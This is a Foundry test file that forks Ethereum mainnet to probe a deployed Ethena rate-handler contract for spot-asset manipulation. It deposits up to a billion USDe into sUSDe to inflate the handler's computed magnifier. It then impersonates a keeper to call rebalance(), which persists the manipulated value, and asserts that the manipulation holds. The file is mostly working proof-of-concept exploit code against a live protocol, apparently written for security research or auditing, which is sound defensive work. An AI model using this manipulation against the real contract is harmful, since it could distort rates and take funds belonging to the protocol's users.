// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";

interface IERC20SpotAssets {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC4626SpotAssets {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
}

interface IEthenaRateHandlerSpotAssets {
    function RESERVE_CONTRACT() external view returns (address);
    function SUSDE() external view returns (address);
    function VAULT() external view returns (address);
    function VAULT2() external view returns (address);
    function BORROW_TOKEN() external view returns (address);
    function currentMagnifier() external view returns (uint256);
    function calculateMagnifier() external view returns (uint256);
    function getSUSDEYieldRate() external view returns (uint256);
    function rebalance() external;
}

interface IReserveSpotAssets {
    function isRebalancer(address user) external view returns (bool);
}

contract EthenaRateSpotAssetsManipulationTest is Test {
    address internal constant HANDLER = 0x7F8E0be00A22b251eee9a70d17Ec2980354543A8;
    address internal constant OBSERVED_KEEPER = 0x70FfF8874e46b928d5d100512743e312a7025feA;

    IEthenaRateHandlerSpotAssets internal handler;
    IERC4626SpotAssets internal susde;
    address internal usde;

    event Baseline(
        address reserve,
        address susde,
        address vault,
        address vault2,
        address borrowToken,
        bool keeperAuthorized,
        uint256 totalAssets,
        uint256 yieldRate,
        uint256 currentMagnifier,
        uint256 targetMagnifier
    );

    event DepositProbe(
        uint256 depositAmount,
        uint256 shares,
        uint256 totalAssetsAfter,
        uint256 yieldRateAfter,
        uint256 targetMagnifierAfter,
        bool sameTxRedeemSucceeded,
        uint256 assetsRedeemed
    );

    event PersistenceProbe(
        uint256 depositAmount,
        uint256 magnifierBefore,
        uint256 manipulatedTarget,
        uint256 persistedMagnifier,
        bool redeemSucceeded,
        uint256 restoredTarget,
        uint256 totalAssetsRestored
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), vm.envUint("MAINNET_FORK_BLOCK"));
        handler = IEthenaRateHandlerSpotAssets(HANDLER);
        susde = IERC4626SpotAssets(handler.SUSDE());
        usde = susde.asset();
        IERC20SpotAssets(usde).approve(address(susde), type(uint256).max);
    }

    function _probeDeposit(uint256 amount) internal {
        uint256 snapshot = vm.snapshot();
        deal(usde, address(this), amount);
        uint256 shares = susde.deposit(amount, address(this));
        uint256 totalAssetsAfter = susde.totalAssets();
        uint256 yieldRateAfter = handler.getSUSDEYieldRate();
        uint256 targetAfter = handler.calculateMagnifier();

        bool redeemSucceeded;
        uint256 assetsRedeemed;
        try susde.redeem(shares, address(this), address(this)) returns (uint256 assets) {
            redeemSucceeded = true;
            assetsRedeemed = assets;
        } catch {}

        emit DepositProbe(
            amount,
            shares,
            totalAssetsAfter,
            yieldRateAfter,
            targetAfter,
            redeemSucceeded,
            assetsRedeemed
        );
        vm.revertTo(snapshot);
    }

    function test_activeHandler_spotAssetsManipulationAndExitReachability() public {
        address reserve = handler.RESERVE_CONTRACT();
        bool keeperAuthorized = IReserveSpotAssets(reserve).isRebalancer(OBSERVED_KEEPER);
        emit Baseline(
            reserve,
            address(susde),
            handler.VAULT(),
            handler.VAULT2(),
            handler.BORROW_TOKEN(),
            keeperAuthorized,
            susde.totalAssets(),
            handler.getSUSDEYieldRate(),
            handler.currentMagnifier(),
            handler.calculateMagnifier()
        );

        _probeDeposit(1_000_000e18);
        _probeDeposit(10_000_000e18);
        _probeDeposit(100_000_000e18);
        _probeDeposit(1_000_000_000e18);
    }

    function test_persistManipulatedMagnifier_thenAttemptRestoreAssets() public {
        address reserve = handler.RESERVE_CONTRACT();
        assertTrue(IReserveSpotAssets(reserve).isRebalancer(OBSERVED_KEEPER), "keeper not authorized");

        uint256 amount = 100_000_000e18;
        deal(usde, address(this), amount);
        uint256 magnifierBefore = handler.currentMagnifier();
        uint256 shares = susde.deposit(amount, address(this));
        uint256 manipulatedTarget = handler.calculateMagnifier();

        vm.prank(OBSERVED_KEEPER);
        handler.rebalance();
        uint256 persistedMagnifier = handler.currentMagnifier();

        bool redeemSucceeded;
        try susde.redeem(shares, address(this), address(this)) returns (uint256) {
            redeemSucceeded = true;
        } catch {}

        uint256 restoredTarget = handler.calculateMagnifier();
        emit PersistenceProbe(
            amount,
            magnifierBefore,
            manipulatedTarget,
            persistedMagnifier,
            redeemSucceeded,
            restoredTarget,
            susde.totalAssets()
        );

        assertEq(persistedMagnifier, manipulatedTarget, "manipulated target not persisted");
    }
}
